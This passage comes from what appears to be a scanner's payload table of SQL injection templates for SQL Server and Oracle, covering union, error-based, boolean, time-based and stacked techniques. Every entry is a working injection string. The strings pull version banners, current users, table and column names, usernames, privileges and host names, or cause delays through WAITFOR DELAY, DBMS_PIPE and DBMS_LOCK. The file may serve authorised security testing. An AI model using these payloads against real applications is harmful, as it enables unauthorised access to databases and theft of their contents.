  { id: 'mssql-time-111', dbms: ["SQL Server"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND 1=1; WAITFOR DELAY '0:0:{SLEEP}'/**/", where: 'value' },
  { id: 'mssql-time-112', dbms: ["SQL Server"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; IF(1=1) WAITFOR DELAY '0:0:{SLEEP}'/**/", where: 'value' },
  { id: 'mssql-time-113', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' OR 1=1; WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-114', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=1; WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-115', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: [")"], template: "{ORIG})); WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-stacked-100', dbms: ["SQL Server"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}' {SEP}", where: 'value' },
  { id: 'mssql-stacked-101', dbms: ["SQL Server"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["\";"], template: "{ORIG}\"; WAITFOR DELAY \"0:0:{SLEEP}\" {SEP}", where: 'value' },
  { id: 'mssql-stacked-102', dbms: ["SQL Server"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: [");"], template: "{ORIG}); WAITFOR DELAY '0:0:{SLEEP}' {SEP}", where: 'value' },
  { id: 'mssql-stacked-103', dbms: ["SQL Server"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') ;WAITFOR DELAY '0:0:{SLEEP}' {SEP}", where: 'value' },
  { id: 'mssql-stacked-104', dbms: ["SQL Server"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) WAITFOR DELAY '0:0:{SLEEP}' {SEP}", where: 'value' },
  { id: 'mssql-stacked-105', dbms: ["SQL Server"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; IF(1=1) WAITFOR DELAY '0:0:{SLEEP}' {SEP}", where: 'value' },
  { id: 'mssql-stacked-106', dbms: ["SQL Server"], technique: 'stacked', level: 4, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT 1/0 {SEP}", where: 'value' },
  { id: 'mssql-stacked-107', dbms: ["SQL Server"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=1; WAITFOR DELAY '0:0:{SLEEP}' {SEP}", where: 'value' },
  { id: 'mssql-bool-orderby-109', dbms: ["SQL Server"], technique: 'boolean', level: 5, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},(CASE WHEN 1=1 THEN 1 ELSE 1 END)-- -", falseTemplate: "{ORIG},(CASE WHEN 1=2 THEN 1 ELSE 1/0 END)-- -", where: 'position' },
  { id: 'mssql-error-orderby-143', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},(CONVERT(int,(SELECT DB_NAME())))-- -", where: 'position' },
  { id: 'mssql-bool-groupby-110', dbms: ["SQL Server"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["","'",")","\")"], template: "{ORIG} HAVING 1=1-- -", falseTemplate: "{ORIG} HAVING 1=2-- -", where: 'value' },
  { id: 'mssql-bool-groupby-111', dbms: ["SQL Server"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["'"], template: "{ORIG}' HAVING '1'='1'-- -", falseTemplate: "{ORIG}' HAVING '1'='2'-- -", where: 'value' },
  { id: 'mssql-bool-having-112', dbms: ["SQL Server"], technique: 'boolean', level: 1, risk: 1, clause: ["having"], boundary: ["","'",")","\")"], template: "{ORIG} AND 1=1-- -", falseTemplate: "{ORIG} AND 1=2-- -", where: 'value' },
  { id: 'mssql-bool-where-113', dbms: ["SQL Server"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=1-- -", falseTemplate: "{ORIG}') AND 1=2-- -", where: 'value' },
  { id: 'mssql-bool-where-114', dbms: ["SQL Server"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND '1'='1'-- -", falseTemplate: "{ORIG}')) AND '1'='2'-- -", where: 'value' },
  { id: 'mssql-bool-where-115', dbms: ["SQL Server"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") AND 1=1-- -", falseTemplate: "{ORIG}\") AND 1=2-- -", where: 'value' },
  // ---- Oracle ----
  { id: 'ora-union-100', dbms: ["Oracle"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-union-101', dbms: ["Oracle"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-union-102', dbms: ["Oracle"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: [")"], template: "{ORIG}) UNION SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-union-103', dbms: ["Oracle"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-union-104', dbms: ["Oracle"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-union-105', dbms: ["Oracle"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},user,instance_name FROM v$instance-- -", where: 'value' },
  { id: 'ora-union-106', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT table_name FROM user_tables WHERE ROWNUM=1),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-107', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT column_name FROM user_tab_cols WHERE ROWNUM=1),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-108', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT username FROM all_users WHERE ROWNUM=1),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-109', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT global_name FROM global_name),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-110', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT name FROM v$database),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-111', dbms: ["Oracle"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-union-112', dbms: ["Oracle"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["\"))"], template: "{ORIG}\")) UNION SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-union-113', dbms: ["Oracle"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION ALL SELECT {NUM},user,NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-114', dbms: ["Oracle"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-union-115', dbms: ["Oracle"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},SYS_CONTEXT('USERENV','SERVER_HOST'),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-116', dbms: ["Oracle"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},(SELECT instance_name FROM v$instance),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-117', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT owner FROM all_tables WHERE ROWNUM=1),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-118', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},(SELECT privilege FROM user_sys_privs WHERE ROWNUM=1),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-119', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT tablespace_name FROM user_tablespaces WHERE ROWNUM=1),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-120', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT granted_role FROM user_role_privs WHERE ROWNUM=1),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-121', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION SELECT {NUM},user,(SELECT global_name FROM global_name) FROM dual-- -", where: 'value' },
  { id: 'ora-union-122', dbms: ["Oracle"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},(SELECT host_name FROM v$instance),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-123', dbms: ["Oracle"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION ALL SELECT {NUM},(SELECT username FROM all_users WHERE ROWNUM=1),NULL FROM dual-- -", where: 'value' },
  { id: 'ora-union-124', dbms: ["Oracle"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -", where: 'value' },
  { id: 'ora-error-100', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -", where: 'value' },
  { id: 'ora-error-101', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -", where: 'value' },
  { id: 'ora-error-102', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -", where: 'value' },
  { id: 'ora-error-103', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -", where: 'value' },
  { id: 'ora-error-104', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -", where: 'value' },
  { id: 'ora-error-105', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT user FROM dual)||'</a>').getDocumentVal()-- -", where: 'value' },
  { id: 'ora-error-106', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT table_name FROM user_tables WHERE ROWNUM=1)||'</a>').getDocumentVal()-- -", where: 'value' },
  { id: 'ora-error-107', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -", where: 'value' },
  { id: 'ora-error-108', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -", where: 'value' },
  { id: 'ora-error-109', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT global_name FROM global_name))-- -", where: 'value' },
  { id: 'ora-error-110', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT instance_name FROM v$instance))-- -", where: 'value' },
  { id: 'ora-error-111', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=CTXSYS.DRITHSX.SN(1,(SELECT global_name FROM global_name))-- -", where: 'value' },
  { id: 'ora-error-112', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=XMLTYPE((SELECT banner FROM v$version WHERE ROWNUM=1)).getDocumentVal()-- -", where: 'value' },
  { id: 'ora-error-113', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=XMLTYPE((SELECT global_name FROM global_name)).getDocumentVal()-- -", where: 'value' },
  { id: 'ora-error-114', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT global_name FROM global_name))-- -", where: 'value' },
  { id: 'ora-error-115', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual) IS NULL-- -", where: 'value' },
  { id: 'ora-error-116', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=TO_NUMBER((SELECT user FROM dual))-- -", where: 'value' },
  { id: 'ora-error-117', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS('x')-- -", where: 'value' },
  { id: 'ora-error-118', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG}||UTL_INADDR.GET_HOST_ADDRESS('x')-- -", where: 'value' },
  { id: 'ora-error-119', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND ROWNUM=1||UTL_INADDR.GET_HOST_ADDRESS('x')-- -", where: 'value' },
  { id: 'ora-error-120', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME('x')-- -", where: 'value' },
  { id: 'ora-error-121', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND 1=UTL_INADDR.GET_HOST_NAME('x')-- -", where: 'value' },
  { id: 'ora-error-122', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -", where: 'value' },
  { id: 'ora-error-123', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT global_name FROM global_name))-- -", where: 'value' },
  { id: 'ora-error-124', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT instance_name FROM v$instance))-- -", where: 'value' },
  { id: 'ora-error-125', dbms: ["Oracle"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT owner FROM all_tables WHERE ROWNUM=1))-- -", where: 'value' },
  { id: 'ora-error-126', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))-- -", where: 'value' },
  { id: 'ora-error-127', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=TO_NUMBER((SELECT global_name FROM global_name))-- -", where: 'value' },
  { id: 'ora-error-128', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=TO_DATE((SELECT banner FROM v$version WHERE ROWNUM=1))-- -", where: 'value' },
  { id: 'ora-error-129', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=TO_TIMESTAMP((SELECT user FROM dual))-- -", where: 'value' },
  { id: 'ora-error-130', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT instance_name FROM v$instance)||'</a>').getDocumentVal()-- -", where: 'value' },
  { id: 'ora-error-131', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT global_name FROM global_name)||'</a>').getDocumentVal()-- -", where: 'value' },
  { id: 'ora-error-132', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=XMLTYPE((SELECT instance_name FROM v$instance)).getDocumentVal()-- -", where: 'value' },
  { id: 'ora-error-133', dbms: ["Oracle"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT owner FROM all_tables WHERE ROWNUM=1))-- -", where: 'value' },
  { id: 'ora-error-134', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME('x')/**/", where: 'value' },
  { id: 'ora-error-135', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CTXSYS.CONTEXT_ERROR((SELECT XMLType(dbms_xmlgen.getxml('SELECT banner FROM v$version WHERE rownum=1')).getStringVal() FROM dual))-- -", where: 'value' },
  { id: 'ora-boolean-100', dbms: ["Oracle"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'ora-boolean-101', dbms: ["Oracle"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND \"1\"=\"2", where: 'value' },
  { id: 'ora-boolean-102', dbms: ["Oracle"], technique: 'boolean', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' OR '1'='2", where: 'value' },
  { id: 'ora-boolean-103', dbms: ["Oracle"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND 1=1-- -", falseTemplate: "{ORIG} AND 1=2-- -", where: 'value' },
  { id: 'ora-boolean-104', dbms: ["Oracle"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1'='1/**/", where: 'value' },
  { id: 'ora-boolean-105', dbms: ["Oracle"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT SUBSTR(user,1,1))='S'-- -", falseTemplate: "{ORIG} AND (SELECT SUBSTR(user,1,1))='X'-- -", where: 'value' },
  { id: 'ora-boolean-106', dbms: ["Oracle"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT SUBSTR(user,1,1))='S'-- -", falseTemplate: "{ORIG}' AND (SELECT SUBSTR(user,1,1))='X'-- -", where: 'value' },
  { id: 'ora-boolean-107', dbms: ["Oracle"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))='O'-- -", falseTemplate: "{ORIG} AND (SELECT SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))='X'-- -", where: 'value' },
  { id: 'ora-boolean-108', dbms: ["Oracle"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT 1 FROM dual)=(SELECT 1 FROM dual)-- -", where: 'value' },
  { id: 'ora-boolean-109', dbms: ["Oracle"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT 1 FROM dual)=(SELECT 2 FROM dual)-- -", where: 'value' },
  { id: 'ora-boolean-110', dbms: ["Oracle"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND DECODE((SELECT 1 FROM dual WHERE 1=1), 1, 1, 0)=1-- -", where: 'value' },
  { id: 'ora-boolean-111', dbms: ["Oracle"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND NVL((SELECT 1 FROM dual WHERE 1=1), 0)=1-- -", where: 'value' },
  { id: 'ora-time-100', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)=0-- -", where: 'value' },
  { id: 'ora-time-101', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -", where: 'value' },
  { id: 'ora-time-102', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM DUAL)=0-- -", where: 'value' },
  { id: 'ora-time-103', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -", where: 'value' },
  { id: 'ora-time-104', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM=1 AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0)-- -", where: 'value' },
  { id: 'ora-time-105', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -", where: 'value' },
  { id: 'ora-time-106', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -", where: 'value' },
  { id: 'ora-time-107', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)=0-- -", where: 'value' },
  { id: 'ora-time-108', dbms: ["Oracle"], technique: 'time', level: 4, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT DECODE(SUM(b.object_id),NULL,1,1) FROM all_objects a, all_objects b WHERE a.object_id=b.object_id)>0-- -", where: 'value' },
  { id: 'ora-time-109', dbms: ["Oracle"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT CASE WHEN DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0 THEN 1 ELSE 2 END FROM dual)-- -", where: 'value' },
  { id: 'ora-time-110', dbms: ["Oracle"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0/**/", where: 'value' },
  { id: 'ora-time-111', dbms: ["Oracle"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})-- -", where: 'value' },
  { id: 'ora-time-112', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})-- -", where: 'value' },
  { id: 'ora-time-113', dbms: ["Oracle"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})-- -", where: 'value' },
  { id: 'ora-time-114', dbms: ["Oracle"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})-- -", where: 'value' },
  { id: 'ora-time-115', dbms: ["Oracle"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})/**/", where: 'value' },
  { id: 'ora-time-116', dbms: ["Oracle"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})=0) IS NOT NULL-- -", where: 'value' },
  { id: 'ora-time-117', dbms: ["Oracle"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT CASE WHEN DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})=0 THEN 1 ELSE 2 END FROM dual)-- -", where: 'value' },
  { id: 'ora-time-118', dbms: ["Oracle"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}) IS NOT NULL-- -", where: 'value' },
  { id: 'ora-time-119', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND DBMS_LOCK.SLEEP({SLEEP})-- -", where: 'value' },
  { id: 'ora-bool-orderby-112', dbms: ["Oracle"], technique: 'boolean', level: 4, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},(SELECT 1 FROM dual)-- -", falseTemplate: "{ORIG},(SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END FROM dual)-- -", where: 'position' },
  { id: 'ora-bool-orderby-113', dbms: ["Oracle"], technique: 'boolean', level: 4, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},(SELECT 'a' FROM dual)-- -", falseTemplate: "{ORIG},(SELECT 1/0 FROM dual)-- -", where: 'position' },
  { id: 'ora-error-orderby-136', dbms: ["Oracle"], technique: 'error', level: 2, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},(SELECT CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)-- -", where: 'position' },
  { id: 'ora-time-orderby-120', dbms: ["Oracle"], technique: 'time', level: 1, risk: 2, clause: ["orderby"], boundary: [""], template: "{ORIG},(SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)-- -", where: 'position' },
  { id: 'ora-bool-groupby-114', dbms: ["Oracle"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["","'",")","\")"], template: "{ORIG} HAVING 1=1-- -", falseTemplate: "{ORIG} HAVING 1=2-- -", where: 'value' },
  { id: 'ora-bool-groupby-115', dbms: ["Oracle"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["'"], template: "{ORIG}' HAVING '1'='1'-- -", falseTemplate: "{ORIG}' HAVING '1'='2'-- -", where: 'value' },
